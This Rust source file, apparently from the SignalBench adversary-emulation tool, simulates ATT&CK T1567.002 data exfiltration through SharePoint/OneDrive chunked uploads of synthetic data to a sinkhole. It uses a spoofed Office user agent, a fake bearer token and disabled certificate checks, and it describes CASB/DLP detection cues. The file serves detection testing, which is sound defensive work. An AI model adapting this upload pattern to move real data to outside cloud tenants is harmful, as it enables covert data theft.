// SPDX-FileCopyrightText: GoCortexIO
// SPDX-License-Identifier: AGPL-3.0-or-later

use crate::config::TechniqueConfig;
use crate::techniques::{
    AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique,
};
use async_trait::async_trait;
use log::{debug, error, info, warn};
use std::fs::File;
use std::io::Write;
use std::path::Path;
use tokio::time::{sleep, Duration};

const CHUNK_SIZE: usize = 32 * 1024; // 32 KB
const TOTAL_SIZE: usize = 4 * CHUNK_SIZE; // 128 KB (4 chunks)
const SP_UA: &str =
    "Microsoft Office/16.0 (Windows NT 10.0; Microsoft SharePoint; MAPI 15.00.4569.1508)";
const SP_AUTH: &str = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIngtbXMtbGlicmFyeSI6ImxjYXBpIn0.eyJhcHBpZCI6InNpZ25hbGJlbmNoLXQxNTY3In0.telemetry-only";

fn random_8hex() -> String {
    format!("{:08x}", rand::random::<u32>())
}

fn chunk_data(idx: usize) -> Vec<u8> {
    // Pseudo-binary payload -- not compressible, looks like encrypted data
    let base = (idx * CHUNK_SIZE) as u8;
    (0..CHUNK_SIZE)
        .map(|i| (i as u8).wrapping_add(base).wrapping_mul(0x37))
        .collect()
}

/// Runs one 5-request chunked upload session (1 POST + 3 PUT + 1 PUT finalize).
/// Returns the number of requests that were sent (including errored ones).
async fn upload_session(
    client: &reqwest::Client,
    host: &str,
    log: &mut File,
    label: &str,
) -> u32 {
    let file_id = uuid::Uuid::new_v4();
    let session_id = uuid::Uuid::new_v4();
    let filename = format!("signalbench-{file_id}.bin");
    let create_url = format!(
        "https://{host}/_api/v2.0/drives/root/items/root:/{filename}:/createUploadSession"
    );
    let upload_url = format!("https://{host}/_api/v2.0/drives/root/tempUpload/{session_id}");

    let mut sent = 0u32;

    // -- 1. createUploadSession ----------------------------------------------
    writeln!(log, "\n[{label}] POST createUploadSession").unwrap();
    writeln!(log, "  URL: {create_url}").unwrap();
    let create_body = format!(
        r#"{{"item":{{"@microsoft.graph.conflictBehavior":"rename","name":"{filename}"}}}}"#
    );
    match client
        .post(&create_url)
        .header("Authorization", SP_AUTH)
        .header("Content-Type", "application/json")
        .header("Accept", "application/json;odata=verbose")
        .header("User-Agent", SP_UA)
        .header("X-ClientService-ClientTag", "SignalBench/1.0 T1567.002")
        .body(create_body)
        .send()
        .await
    {
        Ok(resp) => {
            sent += 1;
            writeln!(log, "  -> HTTP {}", resp.status()).unwrap();
            info!("[T1567.002-SP] [{label}] createUploadSession -> HTTP {}", resp.status());
        }
        Err(e) => {
            writeln!(log, "  -> ERROR: {e}").unwrap();
            warn!("[T1567.002-SP] [{label}] createUploadSession error: {e}");
        }
    }

    // -- 2-4. continueupload (3 x 32 KB chunks) ------------------------------
    for idx in 0..3usize {
        let start = idx * CHUNK_SIZE;
        let end = start + CHUNK_SIZE - 1;
        let range = format!("bytes {start}-{end}/{TOTAL_SIZE}");
        writeln!(log, "\n[{label}] PUT chunk {} ({range})", idx + 1).unwrap();

        match client
            .put(&upload_url)
            .header("Authorization", SP_AUTH)
            .header("Content-Type", "application/octet-stream")
            .header("Content-Range", &range)
            .header("User-Agent", SP_UA)
            .body(chunk_data(idx))
            .send()
            .await
        {
            Ok(resp) => {
                sent += 1;
                writeln!(log, "  -> HTTP {}", resp.status()).unwrap();
                info!(
                    "[T1567.002-SP] [{label}] chunk {} -> HTTP {}",
                    idx + 1,
                    resp.status()
                );
            }
            Err(e) => {
                writeln!(log, "  -> ERROR: {e}").unwrap();
                warn!("[T1567.002-SP] [{label}] chunk {} error: {e}", idx + 1);
            }
        }

        sleep(Duration::from_millis(150)).await;
    }

    // -- 5. finishupload (final 32 KB chunk) ---------------------------------
    {
        let start = 3 * CHUNK_SIZE;
        let end = TOTAL_SIZE - 1;
        let range = format!("bytes {start}-{end}/{TOTAL_SIZE}");
        writeln!(log, "\n[{label}] PUT finishupload ({range})").unwrap();

        match client
            .put(&upload_url)
            .header("Authorization", SP_AUTH)
            .header("Content-Type", "application/octet-stream")
            .header("Content-Range", &range)
            .header("User-Agent", SP_UA)
            .body(chunk_data(3))
            .send()
            .await
        {
            Ok(resp) => {
                sent += 1;
                writeln!(log, "  -> HTTP {} (finalize)", resp.status()).unwrap();
                info!("[T1567.002-SP] [{label}] finishupload -> HTTP {}", resp.status());
            }
            Err(e) => {
                writeln!(log, "  -> ERROR: {e}").unwrap();
                warn!("[T1567.002-SP] [{label}] finishupload error: {e}");
            }
        }
    }

    sent
}

// ======================================
// T1567.002-SP - SharePoint/OneDrive Chunked Upload Exfiltration
// ======================================
pub struct SharePointExfil {}

#[async_trait]
impl AttackTechnique for SharePointExfil {
    fn info(&self) -> Technique {
        Technique {
            id: "T1567.002-SP".to_string(),
            name: "Exfiltration to SharePoint/OneDrive (Chunked Upload)".to_string(),
            description: "Simulates data exfiltration via the SharePoint REST chunked upload API. Runs two back-to-back sessions: corporate tenant (signalbench-<8hex>.sharepoint.com) and OneDrive-for-Business (signalbench-<8hex>-my.sharepoint.com). Each session = 5 HTTPS requests: createUploadSession POST + 3x 32KB PUT + finalize PUT (128KB/session, 256KB total). SNI carries the synthetic *.sharepoint.com hostname; traffic routes to the sinkhole.".to_string(),
            category: "EXFILTRATION".to_string(),
            parameters: vec![],
            detection: "SharePoint REST API chunked uploads to unfamiliar tenant subdomains (signalbench-*.sharepoint.com), synthetic bearer tokens, and application/octet-stream PUT sequences trigger CASB and DLP alerts.".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, _config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            let log_path = "/tmp/signalbench_t1567_sp.log".to_string();

            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: "Would run two SharePoint chunked-upload sessions to sinkhole (tenant + OneDrive, 10 HTTPS requests, ~256 KB total)".to_string(),
                    artifacts: vec![log_path],
                    cleanup_required: true,
                });
            }

            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
            let hex_id = random_8hex();
            let tenant_host = format!("signalbench-{hex_id}.sharepoint.com");
            let onedrive_host = format!("signalbench-{hex_id}-my.sharepoint.com");

            let sinkhole_addr: std::net::SocketAddr =
                match format!("{sinkhole_ip}:443").parse() {
                    Ok(a) => a,
                    Err(e) => return Err(format!("Invalid sinkhole address: {e}")),
                };

            let client = match reqwest::Client::builder()
                .danger_accept_invalid_certs(true)
                .resolve(&tenant_host, sinkhole_addr)
                .resolve(&onedrive_host, sinkhole_addr)
                .timeout(Duration::from_secs(30))
                .build()
            {
                Ok(c) => c,
                Err(e) => return Err(format!("Failed to build HTTP client: {e}")),
            };

            let mut log = match File::create(&log_path) {
                Ok(f) => f,
                Err(e) => return Err(format!("Failed to create log file: {e}")),
            };

            writeln!(
                log,
                "# SignalBench T1567.002-SP - SharePoint Chunked Upload Exfiltration"
            )
            .unwrap();
            writeln!(log, "# Sinkhole IP: {sinkhole_ip}").unwrap();
            writeln!(log, "# Tenant host:  {tenant_host}").unwrap();
            writeln!(log, "# OneDrive host: {onedrive_host}").unwrap();
            writeln!(
                log,
                "# Chunk: {CHUNK_SIZE} bytes | Session total: {TOTAL_SIZE} bytes"
            )
            .unwrap();
            writeln!(log, "# Started: {}", chrono::Local::now()).unwrap();
            writeln!(
                log,
                "# ========================================================"
            )
            .unwrap();

            info!("[T1567.002-SP] Tenant session -> {tenant_host}");
            println!("[T1567.002-SP] Tenant session:  {tenant_host} (-> {sinkhole_ip})");
            let tenant_sent = upload_session(&client, &tenant_host, &mut log, "TENANT").await;

            sleep(Duration::from_secs(2)).await;

            info!("[T1567.002-SP] OneDrive session -> {onedrive_host}");
            println!("[T1567.002-SP] OneDrive session: {onedrive_host} (-> {sinkhole_ip})");
            let onedrive_sent =
                upload_session(&client, &onedrive_host, &mut log, "ONEDRIVE").await;

            let total_sent = tenant_sent + onedrive_sent;
            // Each data PUT carries CHUNK_SIZE bytes; subtract 2 for the createUploadSession POSTs
            let data_puts = total_sent.saturating_sub(2) as usize;
            let total_kb = (data_puts * CHUNK_SIZE) / 1024;

            writeln!(
                log,
                "\n# ========================================================"
            )
            .unwrap();
            writeln!(log, "# SUMMARY").unwrap();
            writeln!(
                log,
                "# Requests: {total_sent} ({tenant_sent} tenant + {onedrive_sent} OneDrive)"
            )
            .unwrap();
            writeln!(log, "# Data uploaded: ~{total_kb} KB").unwrap();
            writeln!(log, "# Completed: {}", chrono::Local::now()).unwrap();
            writeln!(
                log,
                "# ========================================================"
            )
            .unwrap();

            drop(log);

            let summary = format!(
                "SharePoint exfil: {total_sent} requests ({tenant_sent} tenant + {onedrive_sent} OneDrive), ~{total_kb} KB to sinkhole"
            );
            info!("[T1567.002-SP] {summary}");
            println!("\n[T1567.002-SP] {summary}");
            println!("[T1567.002-SP] Log: {log_path}");

            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: summary,
                artifacts: vec![log_path],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}
